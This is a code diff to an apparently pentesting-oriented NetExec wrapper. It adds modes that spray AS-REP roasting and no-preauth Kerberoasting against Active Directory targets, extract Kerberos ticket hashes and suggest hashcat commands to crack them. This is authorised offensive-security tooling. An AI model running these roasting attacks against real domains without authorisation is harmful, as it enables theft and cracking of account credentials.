@@ -109,6 +109,7 @@ from ..parsing.targets import TargetExpansionError, expand_targets
 
 # Import reporting functions
 from ..reporting import (
+    export_copy_paste_to_files,
     print_copy_paste_section,
     print_executive_summary,
     print_executive_summary_multi,
@@ -175,6 +176,8 @@ def _run_single_target(
             if not success:
                 status("Target hostname does not resolve to target IP", "error")
                 output(f"  Add to /etc/hosts: {c(hosts_line, Colors.YELLOW)}")
+                echo_cmd = 'echo "{}" | sudo tee -a /etc/hosts'.format(hosts_line)
+                output(f"  Command: {c(echo_cmd, Colors.CYAN)}")
                 output("")
                 status(
                     "Use --skip-hosts-check to bypass this check (not recommended)",
@@ -255,7 +258,7 @@ def _run_single_target(
     if not args.no_validate and not anonymous_mode:
         if multi_cred_mode:
             # Multi-credential validation (parallel)
-            valid_creds = validate_credentials_multi(target, working_creds, args.timeout)
+            valid_creds = validate_credentials_multi(target, working_creds, args.timeout, args)
             if not valid_creds:
                 elapsed = time.time() - target_start
                 return TargetResult(
@@ -602,6 +605,12 @@ def _run_single_target(
     # Print aggregated copy-paste section
     print_copy_paste_section(cache, args)
 
+    # Export copy-paste lists to individual files if requested
+    if getattr(args, "copy_paste_dir", None):
+        files_written = export_copy_paste_to_files(cache, args.copy_paste_dir)
+        if files_written > 0:
+            status(f"Wrote {files_written} copy-paste files to {args.copy_paste_dir}/", "success")
+
     elapsed = time.time() - target_start
 
     # Capture per-target data for separate output files
@@ -653,6 +662,312 @@ def _run_target_parallel(
     return result, list(_target_local.buffer)
 
 
+def run_asreproast_spray(args, targets: list[str]) -> int:
+    """Run unauthenticated AS-REP roasting against userlist.
+
+    This mode bypasses normal credential validation and directly requests
+    AS-REP tickets for each user in the list, similar to nxc's native behavior.
+
+    Args:
+        args: Parsed command-line arguments
+        targets: List of target hosts
+
+    Returns:
+        Exit code (0 for success)
+    """
+    import tempfile
+
+    # Read users from file or use single user
+    users = []
+    if args.userfile:
+        try:
+            with open(args.userfile, encoding="utf-8-sig") as f:
+                users = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
+        except FileNotFoundError:
+            print(f"Error: User file '{args.userfile}' not found")
+            return 1
+        except PermissionError:
+            print(f"Error: Permission denied reading '{args.userfile}'")
+            return 1
+    elif args.user:
+        users = [args.user]
+
+    if not users:
+        print("Error: No users provided for AS-REP roasting")
+        return 1
+
+    print_banner()
+    status(
+        f"AS-REP Roasting mode: Testing {len(users)} user(s) against {len(targets)} target(s)",
+        "info",
+    )
+    output("")
+
+    all_hashes = []
+    vulnerable_users = set()
+
+    for target in targets:
+        print_section("AS-REP Roasting", target)
+
+        # Create temp file for hashes
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tmp:
+            hash_file = tmp.name
+
+        # Build nxc command - pass users directly (nxc accepts multiple -u args or file)
+        # Using empty password for unauthenticated AS-REP requests
+        password = args.password if args.password is not None else ""
+
+        # nxc can take multiple users via file or repeated -u flags
+        # For simplicity, we'll pass the userfile directly if provided
+        if args.userfile:
+            cmd_args = [
+                "ldap",
+                target,
+                "-u",
+                args.userfile,
+                "-p",
+                password,
+                "--asreproast",
+                hash_file,
+            ]
+        else:
+            cmd_args = ["ldap", target, "-u", args.user, "-p", password, "--asreproast", hash_file]
+
+        # Add domain if specified
+        if args.domain:
+            cmd_args.extend(["-d", args.domain])
+
+        status(f"Requesting AS-REP tickets for {len(users)} user(s)...", "info")
+        rc, stdout, stderr = run_nxc(cmd_args, args.timeout)
+
+        # Check for hashes in output file
+        try:
+            with open(hash_file, encoding="utf-8") as f:
+                hashes = [ln.strip() for ln in f if ln.strip() and "$krb5asrep$" in ln]
+
+            if hashes:
+                status(f"Found {len(hashes)} AS-REP hash(es)!", "warning")
+                output("")
+                for h in hashes:
+                    # Extract username from hash ($krb5asrep$23$user@DOMAIN:...)
+                    try:
+                        user_part = h.split("$")[3]
+                        username = user_part.split("@")[0]
+                        vulnerable_users.add(username)
+                        output(c(f"  [!] {username}", Colors.RED))
+                    except (IndexError, ValueError):
+                        output(f"  {h[:80]}...")
+                all_hashes.extend(hashes)
+            else:
+                # Check stdout for indicators
+                if "DONT_REQ_PREAUTH" in stdout or "$krb5asrep$" in stdout:
+                    status(
+                        "AS-REP response received but hash extraction may have failed", "warning"
+                    )
+                    output(stdout)
+                else:
+                    status("No AS-REP roastable users found", "info")
+
+            # Cleanup temp file
+            os.unlink(hash_file)
+        except FileNotFoundError:
+            status("No hashes retrieved", "info")
+        except Exception as e:
+            status(f"Error reading hashes: {e}", "error")
+
+        output("")
+
+    # Summary
+    if all_hashes:
+        print_section("AS-REP Roasting Summary", "Results")
+        status(f"Total vulnerable accounts: {len(vulnerable_users)}", "warning")
+        output("")
+        output(c("VULNERABLE USERS:", Colors.RED))
+        for user in sorted(vulnerable_users):
+            output(f"  {c(user, Colors.RED)}")
+        output("")
+        output(c("NEXT STEPS:", Colors.YELLOW))
+        output("  1. Save hashes to a file")
+        output("  2. Crack with hashcat: hashcat -m 18200 hashes.txt wordlist.txt")
+        output("")
+
+        # Write hashes to output file if specified
+        if args.output:
+            try:
+                with open(args.output, "w", encoding="utf-8") as f:
+                    f.write("\n".join(all_hashes))
+                status(f"Hashes written to {args.output}", "success")
+            except Exception as e:
+                status(f"Error writing output file: {e}", "error")
+    else:
+        status("No AS-REP roastable accounts found across all targets", "info")
+
+    return 0
+
+
+def run_kerberoast_spray(args, targets: list[str]) -> int:
+    """Run kerberoasting against target accounts.
+
+    Supports two modes:
+    1. Standard: With valid credentials, request TGS for specified accounts
+    2. No-preauth: Using an AS-REP roastable account (no password needed)
+
+    Args:
+        args: Parsed command-line arguments
+        targets: List of target hosts
+
+    Returns:
+        Exit code (0 for success)
+    """
+    import tempfile
+
+    # Determine the AS-REP roastable user (for authentication)
+    asrep_user = None
+    if args.userfile:
+        try:
+            with open(args.userfile, encoding="utf-8-sig") as f:
+                users = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
+                if users:
+                    asrep_user = users[0]  # Use first user as AS-REP roastable account
+        except (FileNotFoundError, PermissionError) as e:
+            print(f"Error reading user file: {e}")
+            return 1
+    elif args.user:
+        asrep_user = args.user
+
+    if not asrep_user:
+        print("Error: No user provided for kerberoasting")
+        return 1
+
+    # Check for no-preauth-targets file
+    if not args.no_preauth_targets:
+        print("Error: --kerberoast with empty password requires --no-preauth-targets FILE")
+        print(
+            "Usage: nxc-enum target -u asrep_user -p '' --kerberoast --no-preauth-targets accounts.txt"
+        )
+        return 1
+
+    try:
+        with open(args.no_preauth_targets, encoding="utf-8-sig") as f:
+            target_accounts = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
+    except FileNotFoundError:
+        print(f"Error: Target accounts file '{args.no_preauth_targets}' not found")
+        return 1
+    except PermissionError:
+        print(f"Error: Permission denied reading '{args.no_preauth_targets}'")
+        return 1
+
+    if not target_accounts:
+        print("Error: No target accounts in file")
+        return 1
+
+    print_banner()
+    status(
+        f"Kerberoasting mode: Using AS-REP roastable user '{asrep_user}' to target "
+        f"{len(target_accounts)} account(s)",
+        "info",
+    )
+    output("")
+
+    all_hashes = []
+    roasted_users = set()
+
+    for target in targets:
+        print_section("Kerberoasting (No Pre-Auth)", target)
+
+        # Create temp file for hashes
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tmp:
+            hash_file = tmp.name
+
+        # Build nxc command with --no-preauth-targets
+        password = args.password if args.password is not None else ""
+        cmd_args = [
+            "ldap",
+            target,
+            "-u",
+            asrep_user,
+            "-p",
+            password,
+            "--no-preauth-targets",
+            args.no_preauth_targets,
+            "--kerberoasting",
+            hash_file,
+        ]
+
+        # Add domain if specified
+        if args.domain:
+            cmd_args.extend(["-d", args.domain])
+
+        status(f"Requesting TGS tickets for {len(target_accounts)} account(s)...", "info")
+        rc, stdout, stderr = run_nxc(cmd_args, args.timeout)
+
+        # Check for hashes in output file
+        try:
+            with open(hash_file, encoding="utf-8") as f:
+                hashes = [ln.strip() for ln in f if ln.strip() and "$krb5tgs$" in ln]
+
+            if hashes:
+                status(f"Found {len(hashes)} TGS hash(es)!", "warning")
+                output("")
+                for h in hashes:
+                    # Extract username from hash ($krb5tgs$23$*user$DOMAIN$...)
+                    try:
+                        parts = h.split("$")
+                        if len(parts) >= 4:
+                            user_part = parts[3]
+                            username = user_part.replace("*", "").split("@")[0]
+                            roasted_users.add(username)
+                            output(c(f"  [!] {username}", Colors.RED))
+                    except (IndexError, ValueError):
+                        output(f"  {h[:80]}...")
+                all_hashes.extend(hashes)
+            else:
+                # Check stdout for indicators
+                if "$krb5tgs$" in stdout:
+                    status("TGS response received but hash extraction may have failed", "warning")
+                    output(stdout)
+                elif "KDC_ERR" in stdout or "KDC_ERR" in stderr:
+                    status("Kerberos error - target accounts may not have SPNs", "error")
+                else:
+                    status("No kerberoastable accounts found", "info")
+
+            # Cleanup temp file
+            os.unlink(hash_file)
+        except FileNotFoundError:
+            status("No hashes retrieved", "info")
+        except Exception as e:
+            status(f"Error reading hashes: {e}", "error")
+
+        output("")
+
+    # Summary
+    if all_hashes:
+        print_section("Kerberoasting Summary", "Results")
+        status(f"Total roasted accounts: {len(roasted_users)}", "warning")
+        output("")
+        output(c("ROASTED ACCOUNTS:", Colors.RED))
+        for user in sorted(roasted_users):
+            output(f"  {c(user, Colors.RED)}")
+        output("")
+        output(c("NEXT STEPS:", Colors.YELLOW))
+        output("  1. Save hashes to a file")
+        output("  2. Crack with hashcat: hashcat -m 13100 hashes.txt wordlist.txt")
+        output("")
+
+        # Write hashes to output file if specified
+        if args.output:
+            try:
+                with open(args.output, "w", encoding="utf-8") as f:
+                    f.write("\n".join(all_hashes))
+                status(f"Hashes written to {args.output}", "success")
+            except Exception as e:
+                status(f"Error writing output file: {e}", "error")
+    else:
+        status("No kerberoastable accounts found across all targets", "info")
+
+    return 0
+
+
 def detect_proxychains() -> bool:
     """Detect if running under proxychains via LD_PRELOAD environment variable."""
     ld_preload = os.environ.get("LD_PRELOAD", "")
@@ -696,14 +1011,17 @@ def main():
         sys.exit(1)
 
     # Validate argument combinations
-    if args.credfile and (args.userfile or args.passfile):
-        print("Error: Cannot use -C with -U/-P. Use one or the other.")
+    if args.credfile and (args.userfile or args.passfile or args.user or args.password):
+        print("Error: Cannot use -C with other credential options. Use -C alone.")
         sys.exit(1)
-    if (args.userfile and not args.passfile) or (args.passfile and not args.userfile):
-        print("Error: -U and -P must be used together.")
+    if args.passfile and not (args.userfile or args.user):
+        print("Error: -P (password file) requires -U (user file) or -u (single user).")
         sys.exit(1)
-    if (args.credfile or args.userfile) and args.user:
-        print("Error: Cannot use -u with credential files. Use one or the other.")
+    if args.userfile and args.user:
+        print("Error: Cannot use both -U (user file) and -u (single user).")
+        sys.exit(1)
+    if args.passfile and args.password:
+        print("Error: Cannot use both -P (password file) and -p (single password).")
         sys.exit(1)
     if args.password and args.hash:
         print("Warning: Both -p and -H provided. Using password (-p), ignoring hash (-H).")
@@ -714,6 +1032,40 @@ def main():
     except TargetExpansionError as e:
         print(f"Error: {e}")
         sys.exit(1)
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # UNAUTHENTICATED AS-REP ROASTING MODE
+    # ─────────────────────────────────────────────────────────────────────────
+    # Detect: --asreproast with -U/-u and empty/no password (no -H hash, no -C credfile)
+    # This mode directly requests AS-REP tickets without credential validation
+    is_unauth_asreproast = (
+        args.asreproast
+        and (args.userfile or args.user)
+        and not args.hash
+        and not args.credfile
+        and not args.passfile
+        and (args.password is None or args.password == "")
+    )
+
+    if is_unauth_asreproast:
+        sys.exit(run_asreproast_spray(args, targets))
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # KERBEROASTING WITH AS-REP ROASTABLE USER (NO PASSWORD)
+    # ─────────────────────────────────────────────────────────────────────────
+    # Detect: --kerberoast with -U/-u and empty/no password + --no-preauth-targets
+    # This mode uses an AS-REP roastable account to request TGS tickets
+    is_nopreauth_kerberoast = (
+        args.kerberoast
+        and (args.userfile or args.user)
+        and not args.hash
+        and not args.credfile
+        and not args.passfile
+        and (args.password is None or args.password == "")
+    )
+
+    if is_nopreauth_kerberoast:
+        sys.exit(run_kerberoast_spray(args, targets))
 
     multi_target_mode = len(targets) > 1
 
